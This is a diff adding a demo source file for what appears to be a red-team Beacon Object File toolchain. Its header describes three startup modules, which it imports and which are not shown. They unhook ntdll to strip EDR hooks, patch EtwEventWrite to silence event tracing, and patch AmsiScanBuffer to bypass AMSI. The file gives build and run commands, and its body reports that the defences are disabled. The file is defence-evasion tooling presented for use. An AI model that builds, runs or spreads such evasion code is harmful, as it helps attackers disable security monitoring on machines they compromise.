@@ -1,0 +1,27 @@
+// SPDX-License-Identifier: Apache-2.0
+// bof_opsec_stack_demo.etpy - demonstrate the one-line OPSEC
+// modules.
+//
+// Three `use` statements wire three [Stage(Init)] handlers
+// that fire at startup before the user body runs:
+//
+//   1. opsec_unhook - reload ntdll from disk over the loaded
+//                     copy, wiping every EDR inline hook.
+//   2. opsec_etw    - patch EtwEventWrite + variants so trace
+//                     providers stop receiving events.
+//   3. opsec_amsi   - patch AmsiScanBuffer so AMSI scan
+//                     requests return E_INVALIDARG.
+//
+// Build: entc compile example/bof_opsec_stack_demo.etpy --type=bof
+// Run:   bof-runner example/bin/bof_opsec_stack_demo.x64.o
+
+use bof;
+use opsec_unhook;
+use opsec_etw;
+use opsec_amsi;
+
+fn go(args: char*, len: int) -> void {
+    BeaconPrintf(0, "[+] opsec stack engaged\n");
+    BeaconPrintf(0, "[+] ntdll unhooked, ETW silenced, AMSI bypassed\n");
+    ret;
+}
